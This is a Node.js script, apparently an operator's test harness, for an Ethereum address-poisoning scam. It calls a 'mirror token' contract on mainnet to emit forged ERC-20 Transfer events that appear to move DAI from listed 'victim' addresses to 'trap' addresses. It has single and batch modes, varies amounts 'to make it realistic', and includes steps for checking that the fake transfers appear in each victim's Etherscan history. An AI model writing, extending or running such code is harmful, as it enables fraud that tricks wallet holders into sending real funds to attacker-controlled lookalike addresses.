import 'dotenv/config';
import { createPublicClient, createWalletClient, http } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { mainnet } from 'viem/chains';

const MIRROR_TOKEN_ADDRESS = process.env.MIRROR_TOKEN_ADDRESS;
let OPERATOR_KEY = process.env.MIRROR_OPERATOR_KEY;

// ─── CLI Mode Selection ───
const MODE = process.argv[2] || 'single';  // 'single' or 'batch'

if (!['single', 'batch'].includes(MODE)) {
    console.error('❌ Invalid mode. Use: node test.js single OR node test.js batch');
    process.exit(1);
}

console.log(`\n🎯 Test Mode: ${MODE.toUpperCase()}\n`);

// ─── Fix private key formatting ───
if (!OPERATOR_KEY) {
    console.error('❌ MIRROR_OPERATOR_KEY not set in .env');
    process.exit(1);
}

OPERATOR_KEY = OPERATOR_KEY.trim();
if (!OPERATOR_KEY.startsWith('0x')) {
    OPERATOR_KEY = `0x${OPERATOR_KEY}`;
}

if (!/^0x[a-fA-F0-9]{64}$/.test(OPERATOR_KEY)) {
    console.error('❌ Invalid private key format. Expected 64 hex characters after 0x');
    console.error(`Got: ${OPERATOR_KEY.slice(0, 10)}...`);
    process.exit(1);
}

console.log(`✅ Private key format valid (${OPERATOR_KEY.slice(0, 10)}...)`);

// ─── 🆕 Updated ABI with batch function ───
const MIRROR_ABI = [
    {
        "inputs": [
            { "internalType": "address", "name": "from", "type": "address" },
            { "internalType": "address", "name": "to", "type": "address" },
            { "internalType": "uint256", "name": "value", "type": "uint256" }
        ],
        "name": "transferFrom",
        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    // 🆕 Batch emission function
    {
        "inputs": [
            { "internalType": "address[]", "name": "froms", "type": "address[]" },
            { "internalType": "address[]", "name": "tos", "type": "address[]" },
            { "internalType": "uint256[]", "name": "values", "type": "uint256[]" }
        ],
        "name": "batchEmitTransfers",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

// ─── DECIMAL SCALING HELPERS ───

function getDecimals(assetSymbol) {
    const decimalsMap = {
        // Native coins (18 decimals)
        'ETH': 18,
        'WETH': 18,
        'BNB': 18,
        'WBNB': 18,
        'MATIC': 18,
        'WMATIC': 18,

        // Stablecoins with 6 decimals
        'USDC': 6,
        'USDC_NATIVE': 6,
        'USDT': 6,
        'BUSD': 6,

        // Stablecoins with 18 decimals
        'DAI': 18,
        'TUSD': 18,
        'FRAX': 18,
        'USDP': 18,

        // BTC variants
        'WBTC': 8,
        'renBTC': 8,
    };

    const symbol = assetSymbol.toUpperCase();
    const decimals = decimalsMap[symbol];

    if (decimals === undefined) {
        console.warn(`⚠️  Unknown token "${assetSymbol}", defaulting to 18 decimals`);
        return 18;
    }

    return decimals;
}

function toRawAmount(humanAmount, assetSymbol) {
    const decimals = getDecimals(assetSymbol);
    const multiplier = 10n ** BigInt(decimals);

    const amountStr = String(humanAmount);

    if (amountStr.includes('.')) {
        const [whole, frac = ''] = amountStr.split('.');
        const paddedFrac = frac.padEnd(decimals, '0').slice(0, decimals);
        const combined = whole + paddedFrac;
        return BigInt(combined);
    } else {
        return BigInt(amountStr) * multiplier;
    }
}

function toHumanAmount(rawAmount, assetSymbol) {
    const decimals = getDecimals(assetSymbol);
    const divisor = 10 ** decimals;
    return (Number(rawAmount) / divisor).toFixed(decimals <= 8 ? decimals : 6);
}

// ─── Configure test addresses ───

// Single mode addresses
const VICTIM_ADDRESS = '0x5127c054e733e72619e613299f59933281eb30ef';
const TRAP_ADDRESS = '0x03f36a6d25398c9a4ffce2aca44cfe82b78c9659';

// 🆕 Batch mode: multiple victims and traps
const BATCH_VICTIMS = [
    '0xf8cb909c54b761a4b74a5eaf23c7fec49feb9ffc',
    '0xf10b3a02d89e2970209add91e9a32b7202997ce5',
    '0xabcdefabcdefabcdefabcdefabcdefabcdefabcd',
    '0x9876543210987654321098765432109876543210',
    '0xfedcbafedcbafedcbafedcbafedcbafedcbafedc',
];

const BATCH_TRAPS = [
    '0x8fa29bfb9a391895aecf81172fcc78609c167e24',
    '0x2345678901234567890123456789012345678901',
    '0xbcdefabcdefabcdefabcdefabcdefabcdefabcde',
    '0x8765432109876543210987654321098765432109',
    '0xedcbafedcbafedcbafedcbafedcbafedcbafedcb',
];

// ─── Amount configuration ───
const ASSET = 'DAI';
const HUMAN_AMOUNT = 10;
const MIRROR_AMOUNT = toRawAmount(HUMAN_AMOUNT, ASSET);

// 🆕 Batch amounts (can be different per victim)
const BATCH_AMOUNTS = BATCH_VICTIMS.map((_, i) => {
    // Vary amounts slightly for each victim to make it realistic
    const variedHuman = HUMAN_AMOUNT + (i * 0.5);
    return toRawAmount(variedHuman, ASSET);
});

async function test() {
    const account = privateKeyToAccount(OPERATOR_KEY);

    const publicClient = createPublicClient({
        chain: mainnet,
        transport: http('https://ethereum.publicnode.com')
    });

    const walletClient = createWalletClient({
        account,
        chain: mainnet,
        transport: http('https://ethereum.publicnode.com')
    });

    console.log(`\n🔑 Operator: ${account.address}`);
    console.log(`💰 Operator balance: ${await publicClient.getBalance({ address: account.address })} wei`);
    console.log(`📄 Contract: ${MIRROR_TOKEN_ADDRESS}`);

    if (MODE === 'single') {
        // ─── SINGLE MODE ───
        console.log(`\n🎯 SINGLE TRANSFER MODE`);
        console.log(`👤 Victim: ${VICTIM_ADDRESS}`);
        console.log(`🪤 Trap: ${TRAP_ADDRESS}`);

        const decimals = getDecimals(ASSET);
        console.log(`\n🎯 Amount Configuration:`);
        console.log(`   Asset: ${ASSET}`);
        console.log(`   Decimals: ${decimals}`);
        console.log(`   Human amount: ${HUMAN_AMOUNT.toLocaleString()} ${ASSET}`);
        console.log(`   Raw amount: ${MIRROR_AMOUNT.toString()}`);
        console.log(`   Expected display: ${toHumanAmount(MIRROR_AMOUNT, ASSET)} ${ASSET}`);

        console.log('\n🚀 Emitting forged Transfer event...');

        const hash = await walletClient.writeContract({
            address: MIRROR_TOKEN_ADDRESS,
            abi: MIRROR_ABI,
            functionName: 'transferFrom',
            args: [VICTIM_ADDRESS, TRAP_ADDRESS, MIRROR_AMOUNT]
        });

        console.log(`✅ TX broadcasted: https://etherscan.io/tx/${hash}`);

        const receipt = await publicClient.waitForTransactionReceipt({ hash });
        console.log(`✅ Confirmed in block ${receipt.blockNumber}`);
        console.log(`✅ Gas used: ${receipt.gasUsed}`);
        console.log(`✅ Logs emitted: ${receipt.logs.length}`);

        // Decode the log
        const log = receipt.logs[0];
        console.log(`\n📋 Event Details:`);
        console.log(`   Contract: ${log.address}`);
        console.log(`   Topic 0 (event signature): ${log.topics[0].slice(0, 20)}...`);
        console.log(`   Topic 1 (from): 0x${log.topics[1].slice(26)}`);
        console.log(`   Topic 2 (to): 0x${log.topics[2].slice(26)}`);

        const valueHex = log.data;
        const valueBigInt = BigInt(valueHex);
        console.log(`   Data (raw value): ${valueBigInt.toString()}`);
        console.log(`   Data (human value): ${toHumanAmount(valueBigInt, ASSET)} ${ASSET}`);

        console.log(`\n🎯 CHECK THESE LINKS:`);
        console.log(`   Victim's token history: https://etherscan.io/address/${VICTIM_ADDRESS}#tokentxns`);
        console.log(`   Trap's token history: https://etherscan.io/address/${TRAP_ADDRESS}#tokentxns`);

        console.log(`\n📊 VERIFICATION STEPS:`);
        console.log(`   1. Open victim's token history (link above)`);
        console.log(`   2. Wait 30-60 seconds for indexing`);
        console.log(`   3. Look for OUT transfer of ${HUMAN_AMOUNT.toLocaleString()} ${ASSET}`);

    } else {
        // ─── BATCH MODE ───
        console.log(`\n🎯 BATCH TRANSFER MODE`);
        console.log(`📦 Batch size: ${BATCH_VICTIMS.length} transfers`);

        console.log(`\n📋 Batch Configuration:`);
        BATCH_VICTIMS.forEach((victim, i) => {
            const humanAmt = toHumanAmount(BATCH_AMOUNTS[i], ASSET);
            console.log(`   ${i + 1}. ${victim} → ${BATCH_TRAPS[i]} (${humanAmt} ${ASSET})`);
        });

        console.log('\n🚀 Emitting batch forged Transfer events...');

        const hash = await walletClient.writeContract({
            address: MIRROR_TOKEN_ADDRESS,
            abi: MIRROR_ABI,
            functionName: 'batchEmitTransfers',
            args: [BATCH_VICTIMS, BATCH_TRAPS, BATCH_AMOUNTS]
        });

        console.log(`✅ TX broadcasted: https://etherscan.io/tx/${hash}`);

        const receipt = await publicClient.waitForTransactionReceipt({ hash });
        console.log(`✅ Confirmed in block ${receipt.blockNumber}`);
        console.log(`✅ Gas used: ${receipt.gasUsed}`);
        console.log(`✅ Logs emitted: ${receipt.logs.length}`);

        // Decode all logs
        console.log(`\n📋 Batch Event Details:`);
        receipt.logs.forEach((log, i) => {
            const from = `0x${log.topics[1].slice(26)}`;
            const to = `0x${log.topics[2].slice(26)}`;
            const valueBigInt = BigInt(log.data);
            const humanValue = toHumanAmount(valueBigInt, ASSET);

            console.log(`\n   Event ${i + 1}:`);
            console.log(`      From: ${from}`);
            console.log(`      To: ${to}`);
            console.log(`      Amount: ${humanValue} ${ASSET} (${valueBigInt.toString()} raw)`);
        });

        console.log(`\n🎯 CHECK THESE LINKS:`);
        BATCH_VICTIMS.forEach((victim, i) => {
            console.log(`   Victim ${i + 1}: https://etherscan.io/address/${victim}#tokentxns`);
        });

        console.log(`\n📊 VERIFICATION STEPS:`);
        console.log(`   1. Open each victim's token history (links above)`);
        console.log(`   2. Wait 30-60 seconds for indexing`);
        console.log(`   3. Verify each victim has an OUT transfer to their respective trap`);
        console.log(`   4. All ${BATCH_VICTIMS.length} transfers should appear in a SINGLE transaction`);
    }
}

test().catch(err => {
    console.error('❌ Test failed:', err.message);
    if (err.message.includes('insufficient funds')) {
        console.error('\n💡 Your operator wallet needs ETH for gas. Send ~0.01 ETH to:',
            OPERATOR_KEY.startsWith('0x') ? 'check account.address above' : 'run test again to see address');
    }
    process.exit(1);
});